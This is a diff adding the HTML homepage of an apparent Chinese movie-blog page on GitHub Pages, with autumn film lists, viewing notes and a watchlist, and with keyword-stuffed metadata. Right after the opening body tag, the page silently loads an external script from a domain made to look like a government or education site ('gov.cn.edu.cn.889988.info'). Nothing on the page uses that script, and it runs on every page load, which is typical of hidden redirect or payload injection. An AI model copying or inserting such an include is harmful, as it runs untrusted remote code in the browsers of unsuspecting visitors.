@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网影音先锋 | 秋日私藏片单与沉浸式观影手记</title>
+<meta name="description" content="秋霞电影网影音先锋（qiuxiadianyingwangyingyinxianfeng-top.github.io）是一个以"秋"为氛围的影视沉浸式陪伴平台。我们不追流量，只做季节感片单、影音双修观感笔记与私人收藏夹，陪你在落叶、晚风和长夜里，把一部好片听进心里。">
+<meta name="keywords" content="秋霞电影网影音先锋, qiuxiadianyingwangyingyinxianfeng-top, 秋日片单, 影音沉浸, 沉浸式观影, 私人收藏夹, 季节电影, 观影手记, GitHub Pages影视博客">
+<style>
+/* ===== 基础重置 ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --amber:#c2560f;
+  --amber2:#e07b2c;
+  --cream:#fdf6ec;
+  --paper:#fffdf8;
+  --ink:#2b2017;
+  --soft:#7a6a56;
+  --line:#e8dcc6;
+  --leaf:#7a9a3a;
+  --shadow:0 4px 18px rgba(194,86,15,.08);
+  --radius:14px;
+  --font:"PingFang SC","Microsoft YaHei","Songti SC",Georgia,serif;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:var(--font);
+  background:var(--cream);
+  color:var(--ink);
+  line-height:1.85;
+  font-size:15.5px;
+  -webkit-tap-highlight-color:transparent;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+::-webkit-scrollbar{height:8px;width:8px}
+::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px}
+
+/* ===== 报头 ===== */
+.masthead{
+  border-bottom:4px double var(--amber);
+  padding:26px 0 14px;text-align:center;
+}
+.masthead .kicker{
+  letter-spacing:.5em;font-size:11px;color:var(--soft);
+  text-transform:uppercase;
+}
+.masthead h1{
+  font-size:38px;font-weight:800;margin:6px 0;letter-spacing:.02em;
+}
+.masthead h1 em{font-style:normal;color:var(--amber)}
+.masthead .sub-line{
+  font-size:13.5px;color:var(--soft);letter-spacing:.05em;
+}
+.masthead .site-url{
+  font-size:11.5px;color:var(--soft);font-family:Menlo,Consolas,monospace;
+  margin-top:6px;
+}
+
+/* ===== 头部导航 ===== */
+.header{
+  border-bottom:1px solid var(--line);
+  background:rgba(253,246,236,.92);
+  backdrop-filter:blur(8px);
+  position:sticky;top:0;z-index:100;
+}
+.header-in{
+  max-width:1160px;margin:0 auto;padding:12px 24px;
+  display:flex;align-items:center;justify-content:space-between;gap:20px;
+}
+.brand-mini{font-size:15px;font-weight:800;letter-spacing:.02em}
+.brand-mini em{font-style:normal;color:var(--amber)}
+.nav{display:flex;gap:2px}
+.nav a{
+  padding:8px 15px;font-size:14px;font-weight:500;color:var(--soft);
+  border-radius:6px;transition:.2s;position:relative;
+}
+.nav a:hover{color:var(--amber);background:rgba(194,86,15,.06)}
+
+/* ===== 主体 ===== */
+.container{max-width:1160px;margin:0 auto;padding:0 24px}
+
+/* 栏目通用 */
+.section{padding:52px 0;border-bottom:1px dashed var(--line)}
+.section:last-of-type{border-bottom:none}
+.sec-head{
+  display:flex;align-items:baseline;justify-content:space-between;
+  margin-bottom:24px;gap:16px;flex-wrap:wrap;
+}
+.sec-title{display:flex;align-items:center;gap:10px}
+.sec-title .en-num{
+  font-family:Georgia,serif;font-size:14px;font-weight:700;color:#fff;
+  background:var(--amber);width:26px;height:26px;border-radius:5px;
+  display:inline-flex;align-items:center;justify-content:center;
+}
+.sec-title h2{font-size:23px;font-weight:800}
+.sec-title .sub{font-size:12px;color:var(--soft);margin-left:8px;font-style:italic}
+.sec-more{font-size:13px;color:var(--soft)}
+.sec-more:hover{color:var(--amber)}
+
+/* ===== 栏目1：秋季片单大横幅（横向滑动） ===== */
+.tape-scroll{overflow-x:auto;overflow-y:hidden;padding:4px 0 18px}
+.tape-track{display:flex;gap:18px;width:max-content;padding-right:24px}
+.tape-card{
+  width:320px;flex-shrink:0;background:var(--paper);
+  border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;transition:.3s;cursor:pointer;
+}
+.tape-card:hover{transform:translateY(-6px);box-shadow:var(--shadow);border-color:rgba(194,86,15,.25)}
+.tape-cover{
+  height:200px;display:flex;align-items:center;justify-content:center;
+  font-size:52px;position:relative;
+}
+.tape-cover .tape-tag{
+  position:absolute;top:12px;left:12px;background:rgba(0,0,0,.5);
+  color:#fff;font-size:10.5px;padding:3px 9px;border-radius:20px;
+}
+.tape-card:nth-child(1) .tape-cover{background:linear-gradient(135deg,#4a3728,#8b5e3c)}
+.tape-card:nth-child(2) .tape-cover{background:linear-gradient(135deg,#2d5a3d,#5c9e6f)}
+.tape-card:nth-child(3) .tape-cover{background:linear-gradient(135deg,#6b3410,#c2560f)}
+.tape-card:nth-child(4) .tape-cover{background:linear-gradient(135deg,#3a3a52,#6b6b9c)}
+.tape-card:nth-child(5) .tape-cover{background:linear-gradient(135deg,#5a2b2b,#a84545)}
+.tape-card:nth-child(6) .tape-cover{background:linear-gradient(135deg,#2b4a5a,#4a8ba8)}
+.tape-info{padding:16px 18px}
+.tape-info h3{font-size:16.5px;font-weight:700;margin-bottom:5px}
+.tape-info p{font-size:13px;color:var(--soft);line-height:1.6}
+.tape-info .tape-meta{
+  margin-top:10px;display:flex;justify-content:space-between;
+  font-size:11.5px;color:var(--soft);border-top:1px solid var(--line);padding-top:8px;
+}
+
+/* ===== 栏目2：影音双修笔记 ===== */
+.av-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.av-card{
+  background:var(--paper);border:1px solid var(--line);
+  border-radius:var(--radius);padding:22px;
+  transition:.25s;cursor:pointer;
+}
+.av-card:hover{border-color:var(--amber);background:#fffaf2}
+.av-card .av-head{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.av-card .av-icon{
+  width:40px;height:40px;border-radius:9px;
+  background:rgba(194,86,15,.1);display:flex;align-items:center;justify-content:center;font-size:19px;
+}
+.av-card h3{font-size:15.5px;font-weight:700}
+.av-card p{font-size:13px;color:var(--soft);line-height:1.7}
+.av-card .av-quote{
+  margin-top:12px;padding:10px 12px;background:rgba(122,154,58,.08);
+  border-radius:8px;font-size:12.5px;color:#5a6b2a;line-height:1.6;
+}
+
+/* ===== 栏目3：私人收藏夹（宫格式） ===== */
+.grid-9{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.cell{
+  position:relative;border-radius:12px;overflow:hidden;cursor:pointer;
+  height:150px;display:flex;align-items:flex-end;
+  transition:.3s;
+}
+.cell:hover{transform:scale(1.02)}
+.cell-cover{
+  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:40px;
+}
+.cell:nth-child(1) .cell-cover{background:linear-gradient(135deg,#2c3e50,#4ca1af)}
+.cell:nth-child(2) .cell-cover{background:linear-gradient(135deg,#5c258d,#4389a2)}
+.cell:nth-child(3) .cell-cover{background:linear-gradient(135deg,#232526,#414345)}
+.cell:nth-child(4) .cell-cover{background:linear-gradient(135deg,#870000,#190a05)}
+.cell:nth-child(5) .cell-cover{background:linear-gradient(135deg,#3a1c71,#d76d77)}
+.cell:nth-child(6) .cell-cover{background:linear-gradient(135deg,#0f2027,#203a43)}
+.cell:nth-child(7) .cell-cover{background:linear-gradient(135deg,#42275a,#734b6d)}
+.cell:nth-child(8) .cell-cover{background:linear-gradient(135deg,#556270,#4e4376)}
+.cell:nth-child(9) .cell-cover{background:linear-gradient(135deg,#c33764,#1d2671)}
+.cell-cap{
+  position:relative;z-index:2;padding:12px 14px;color:#fff;width:100%;
+  background:linear-gradient(to top,rgba(0,0,0,.8),transparent);
+}
+.cell-cap h3{font-size:14px;font-weight:700}
+.cell-cap span{font-size:11px;opacity:.85}
+
+/* ===== 栏目4：长夜书影 ===== */
+.longnight{
+  display:grid;grid-template-columns:1fr 1fr;gap:18px;
+}
+.ln-card{
+  background:var(--paper);border:1px solid var(--line);
+  border-radius:var(--radius);padding:22px 24px;transition:.25s;cursor:pointer;
+}
+.ln-card:hover{border-color:var(--amber)}
+.ln-card .ln-date{
+  font-size:11.5px;color:var(--amber);letter-spacing:1px;margin-bottom:6px;
+  font-family:Menlo,monospace;
+}
+.ln-card h3{font-size:16px;font-weight:700;margin-bottom:7px}
+.ln-card p{font-size:13.5px;color:var(--soft);line-height:1.75}
+.ln-card .ln-foot{
+  margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;
+}
+.ln-card .ln-foot span{
+  font-size:11px;background:rgba(122,154,58,.1);color:#5a6b2a);
+  padding:2px 8px;border-radius:4px;
+}
+
+/* ===== 栏目5：关于本站 ===== */
+.about{
+  background:var(--paper);border:1px solid var(--line);
+  border-radius:var(--radius);padding:30px 32px;
+  display:grid;grid-template-columns:1.3fr 1fr;gap:36px;align-items:center;
+}
+.about h3{font-size:19px;font-weight:800;margin-bottom:12px}
+.about p{font-size:14px;color:var(--soft);line-height:1.9}
+.about p+p{margin-top:10px}
+.about .pull{
+  border-left:3px solid var(--amber);padding-left:16px;margin:14px 0;
+  font-style:italic;color:var(--ink);font-size:14.5px;
+}
+.about-side{text-align:center}
+.about-side .seal{
+  width:120px;height:120px;border-radius:50%;margin:0 auto 14px;
+  background:linear-gradient(135deg,#c2560f,#e07b2c);
+  display:flex;align-items:center;justify-content:center;font-size:46px;
+  box-shadow:0 6px 20px rgba(194,86,15,.25);
+}
+.about-side .seal-text{font-size:13px;color:var(--soft)}
+
+/* ===== 底部 ===== */
+.footer{
+  background:#2b2017;color:#b8a88e;margin-top:50px;padding:42px 0 24px;
+}
+.footer-in{max-width:1160px;margin:0 auto;padding:0 24px}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+.footer-brand h3{color:#fff;font-size:18px;font-weight:800;margin-bottom:10px}
+.footer-brand h3 em{font-style:normal;color:var(--amber2)}
+.footer-brand p{font-size:13px;line-height:1.85;max-width:320px}
+.footer-col h4{color:#fff;font-size:14px;font-weight:700;margin-bottom:12px}
+.footer-col li{margin-bottom:8px}
+.footer-col a{font-size:13px;color:#b8a88e;transition:.2s}
+.footer-col a:hover{color:var(--amber2)}
+.footer-bottom{
+  border-top:1px solid rgba(255,255,255,.1);padding-top:18px;
+  text-align:center;font-size:12px;color:#8a7a60;
+}
+.footer-bottom a{color:var(--amber2)}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .masthead h1{font-size:26px}
+  .nav{display:none}
+  .av-grid{grid-template-columns:1fr}
+  .grid-9{grid-template-columns:repeat(2,1fr)}
+  .longnight{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;gap:24px;text-align:left}
+  .footer-grid{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:480px){
+  .masthead h1{font-size:22px}
+  .container{padding:0 16px}
+  .tape-card{width:260px}
+  .tape-cover{height:160px;font-size:42px}
+  .grid-9{grid-template-columns:1fr 1fr}
+  .cell{height:120px;font-size:32px}
+  .footer-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 报头 -->
+<header class="masthead">
+  <div class="kicker">Autumn Leaves · Film &amp; Sound</div>
+  <h1>秋霞<em>电影网影音先锋</em></h1>
+  <div class="sub-line">秋日私藏片单 · 沉浸式观影手记 · 影音双修</div>
+  <div class="site-url">qiuxiadianyingwangyingyinxianfeng-top.github.io</div>
+</header>
+
+<!-- 导航 -->
+<div class="header">
+  <div class="header-in">
+    <div class="brand-mini">秋霞<em>影音先锋</em></div>
+    <nav class="nav">
+      <a href="#playlist">秋季片单</a>
+      <a href="#av">影音笔记</a>
+      <a href="#shelf">私人收藏</a>
+      <a href="#night">长夜书影</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 主体 -->
+<main class="container">
+
+  <!-- 栏目1：秋季片单（横向滑动大屏） -->
+  <section id="playlist" class="section">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="en-num">1</span>
+        <h2>秋季片单</h2>
+        <span class="sub">Autumn Playlist — 适合落叶、晚风与长夜的九部</span>
+      </div>
+      <a href="#" class="sec-more">完整片单 →</a>
+    </div>
+    <div class="tape-scroll">
+      <div class="tape-track">
+        <div class="tape-card">
+          <div class="tape-cover">🍁<span class="tape-tag">季节首推</span></div>
+          <div class="tape-info">
+            <h3>小森林 秋冬篇</h3>
+            <p>一个人住在东北小村，腌菜、烤面包、看第一场雪。秋天最好的下饭片。</p>
+            <div class="tape-meta"><span>日本 / 美食</span><span>2015</span></div>
+          </div>
+        </div>
+        <div class="tape-card">
+          <div class="tape-cover">🌾<span class="tape-tag">丰收季</span></div>
+          <div class="tape-info">
+            <h3>金色池塘</h3>
+            <p>老夫妻在夏末秋初的湖边木屋，聊死亡、聊和解。秋天看刚好。</p>
+            <div class="tape-meta"><span>美国 / 剧情</span><span>1981</span></div>
+          </div>
+        </div>
+        <div class="tape-card">
+          <div class="tape-cover">🌰<span class="tape-tag">私藏</span></div>
+          <div class="tape-info">
+            <h3>秋天的故事</h3>
+            <p>侯麦四季故事中最温柔的一章，葡萄酒、葡萄园和恰到好处的心动。</p>
+            <div class="tape-meta"><span>法国 / 爱情</span><span>1998</span></div>
+          </div>
+        </div>
+        <div class="tape-card">
+          <div class="tape-cover">🌙<span class="tape-tag">深夜</span></div>
+          <div class="tape-info">
+            <h3>燃烧女子的肖像</h3>
+            <p>布列塔尼的海风与烛光，每一帧都像秋天的油画。</p>
+            <div class="tape-meta"><span>法国 / 爱情</span><span>2019</span></div>
+          </div>
+        </div>
+        <div class="tape-card">
+          <div class="tape-cover">🍂<span class="tape-tag">告别</span></div>
+          <div class="tape-info">
+            <h3>步履不停</h3>
+            <p>一家人只有盂兰盆节才聚在一起，吃饭、拌嘴、怀念长子。</p>
+            <div class="tape-meta"><span>日本 / 家庭</span><span>2008</span></div>
+          </div>
+        </div>
+        <div class="tape-card">
+          <div class="tape-cover">☕<span class="tape-tag">独处</span></div>
+          <div class="tape-info">
+            <h3>咖啡与香烟</h3>
+            <p>贾木许的短片集，一桌一椅两杯咖啡，聊的全是废话与诗意。</p>
+            <div class="tape-meta"><span>美国 / 短片集</span><span>2003</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2：影音双修笔记 -->
+  <section id="av" class="section">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="en-num">2</span>
+        <h2>影音双修</h2>
+        <span class="sub">Visual &amp; Audio — 不止看画面，也听声音</span>
+      </div>
+      <a href="#" class="sec-more">全部笔记 →</a>
+    </div>
+    <div class="av-grid">
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">🎧</div><h3>声音如何讲故事</h3></div>
+        <p>静音比配乐更贵。杜琪峰让五个人站在商场不动，不说话，紧张感就已经到位了。</p>
+        <div class="av-quote">"声音是观众来不及察觉的导演。"</div>
+      </div>
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">🎨</div><h3>秋天的颜色是怎么调出来的</h3></div>
+        <p>从《英雄》里的金黄到《秋天的故事》的暖棕，调色师在用颜色写季节说明书。</p>
+        <div class="av-quote">"秋天不是拍出来的，是调出来的。"</div>
+      </div>
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">🎵</div><h3>三部最适合戴耳机看的片</h3></div>
+        <p>《爆裂鼓手》的鼓点、《星际穿越》的管风琴、《她》的电子乐，关灯戴耳机体验翻倍。</p>
+        <div class="av-quote">"好的电影声音，是第三主角。"</div>
+      </div>
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">🎬</div><h3>为什么长镜头让人喘不过气</h3></div>
+        <p>《人类之子》那段12分钟一镜到底，你不是在"看"，而是在"跟着走"。</p>
+        <div class="av-quote">"剪辑是节奏，长镜是呼吸。"</div>
+      </div>
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">🍃</div><h3>环境音的治愈力</h3></div>
+        <p>《小森林》里的切菜声、《轮回》里的风声，有人专门做ASMR片单用来助眠。</p>
+        <div class="av-quote">"听得到火候，才叫生活。"</div>
+      </div>
+      <div class="av-card">
+        <div class="av-head"><div class="av-icon">📀</div><h3>老片修复的耳朵</h3></div>
+        <p>4K修复不只是画面变清楚，老胶片的底噪被洗掉，对白也重新做了混音。</p>
+        <div class="av-quote">"修复一部老片，是让过去重新被听见。"</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3：私人收藏夹（宫格） -->
+  <section id="shelf" class="section">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="en-num">3</span>
+        <h2>私人收藏夹</h2>
+        <span class="sub">Shelf — 主编反反复复看了不止一遍的九部</span>
+      </div>
+      <a href="#" class="sec-more">管理收藏 →</a>
+    </div>
+    <div class="grid-9">
+      <div class="cell"><div class="cell-cover">🌊</div><div class="cell-cap"><h3>星际穿越</h3><span>科幻 · 重看3次</span></div></div>
+      <div class="cell"><div class="cell-cover">🎹</div><div class="cell-cap"><h3>爆裂鼓手</h3><span>音乐 · 每次都手心出汗</span></div></div>
+      <div class="cell"><div class="cell-cover">🚲</div><div class="cell-cap"><h3> ET外星人</h3><span>童年 · 秋天重看</span></div></div>
+      <div class="cell"><div class="cell-cover">🌻</div><div class="cell-cap"><h3>天堂电影院</h3><span>成长 · 哭点最低</span></div></div>
+      <div class="cell"><div class="cell-cover">🕰️</div><div class="cell-cap"><h3>爱在日落黄昏时</h3><span>爱情 · 适合傍晚</span></div></div>
+      <div class="cell"><div class="cell-cover">🚢</div><div class="cell-cap"><h3>泰坦尼克号</h3><span>经典 · 每年一次</span></div></div>
+      <div class="cell"><div class="cell-cover">🌿</div><div class="cell-cap"><h3>小森林 春夏篇</h3><span>治愈 · 下饭神器</span></div></div>
+      <div class="cell"><div class="cell-cover">🎭</div><div class="cell-cap"><h3>喜剧之王</h3><span>港片 · 笑着哭</span></div></div>
+      <div class="cell"><div class="cell-cover">🪁</div><div class="cell-cap"><h3>龙猫</h3><span>动画 · 秋天的风</span></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目4：长夜书影 -->
+  <section id="night" class="section">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="en-num">4</span>
+        <h2>长夜书影</h2>
+        <span class="sub">Late Night — 天黑之后才写的那些话</span>
+      </div>
+      <a href="#" class="sec-more">更多随笔 →</a>
+    </div>
+    <div class="longnight">
+      <article class="ln-card">
+        <div class="ln-date">OCT · 06 · LATE NIGHT</div>
+        <h3>为什么我总在秋天重看《小森林》</h3>
+        <p>不是因为它好看，而是因为它允许我什么都不做。切菜、腌菜、烤面包，没有人在催你。秋天的焦虑，好像被那种慢节奏一点点熨平了。</p>
+        <div class="ln-foot"><span>治愈</span><span>美食</span><span>慢生活</span></div>
+      </article>
+      <article class="ln-card">
+        <div class="ln-date">OCT · 04 · LATE NIGHT</div>
+        <h3>戴上耳机重新听了《星际穿越》</h3>
+        <p>关灯，戴耳机，音量调到刚好。管风琴的低频从胸腔穿过，才懂为什么有人说汉斯·季默是在"演奏物理"。声音真的能改变一部电影。</p>
+        <div class="ln-foot"><span>声音</span><span>科幻</span><span>汉斯·季默</span></div>
+      </article>
+      <article class="ln-card">
+        <div class="ln-date">OCT · 01 · LATE NIGHT</div>
+        <h3>秋天是最好的观影季</h3>
+        <p>白天变短，夜变长，外面又冷，正好名正言顺地窝在沙发里。夏天太亮太吵，只有秋天让人愿意沉下来，看一部需要耐心的片子。</p>
+        <div class="ln-foot"><span>季节</span><span>随笔</span></article>
+      </article>
+      <article class="ln-card">
+        <div class="ln-date">SEP · 28 · LATE NIGHT</div>
+        <h3>关于"反复看同一部片"这件事</h3>
+        <p>有人觉得重看浪费时间，但第一次看剧情，第二次看细节，第三次看自己。你变了，片子没变，看出去的东西就不一样了。</p>
+        <div class="ln-foot"><span>重看</span><span>方法</span></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目5：关于本站 -->
+  <section id="about" class="section">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="en-num">5</span>
+        <h2>关于本站</h2>
+        <span class="sub">About — 我们不做导航，只做陪伴</span>
+      </div>
+    </div>
+    <div class="about">
+      <div>
+        <h3>秋霞电影网影音先锋在做什么</h3>
+        <p>我们不追流量，不堆片源。这里只有三件事：按季节整理片单、写影音双修的观感笔记、和一份不断变长的私人收藏夹。</p>
+        <div class="pull">"秋天很短，好片子值得被认真对待。"</div>
+        <p>秋霞电影网影音先锋（qiuxiadianyingwangyingyinxianfeng-top.github.io）由影视爱好者维护，更新不快，但每篇都看过不止一遍。</p>
+      </div>
+      <div class="about-side">
+        <div class="seal">🍁</div>
+        <div class="seal-text">每片皆手选<br>每句皆真看</div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- 底部 -->
+<footer class="footer">
+  <div class="footer-in">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <h3>秋霞<em>电影网影音先锋</em></h3>
+        <p>秋霞电影网影音先锋（qiuxiadianyingwangyingyinxianfeng-top.github.io）—— 秋日私藏片单、影音双修笔记与私人收藏夹。只做陪伴，不追流量。</p>
+      </div>
+      <div class="footer-col">
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#playlist">秋季片单</a></li>
+          <li><a href="#av">影音笔记</a></li>
+          <li><a href="#shelf">私人收藏</a></li>
+          <li><a href="#night">长夜书影</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>手记分类</h4>
+        <ul>
+          <li><a href="#">声音</a></li>
+          <li><a href="#">调色</a></li>
+          <li><a href="#">长镜头</a></li>
+          <li><a href="#">修复</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>访问地址</h4>
+        <ul>
+          <li><a href="https://qiuxiadianyingwangyingyinxianfeng-top.github.io">qiuxiadianyingwangyingyinxianfeng-top.github.io</a></li>
+          <li><a href="#">GitHub Pages</a></li>
+          <li><a href="#">静态网站</a></li>
+          <li><a href="#">免费访问</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 秋霞电影网影音先锋（qiuxiadianyingwangyingyinxianfeng-top.github.io）| 本页仅含 index.html，未生成 robots.txt 与 sitemap.xml | 影视文化与观感交流</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 平滑滚动
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click', function(e){
+    var href = this.getAttribute('href');
+    if(href === '#') return;
+    e.preventDefault();
+    var t = document.querySelector(href);
+    if(t) t.scrollIntoView({behavior:'smooth', block:'start'});
+  });
+});
+// 卡片点击演示
+document.querySelectorAll('.tape-card, .av-card, .cell, .ln-card').forEach(function(el){
+  el.addEventListener('click', function(){
+    alert('秋霞电影网影音先锋 · 演示页\n实际部署时跳转至对应内容页。');
+  });
+});
+</script>
+
+</body>
+</html>
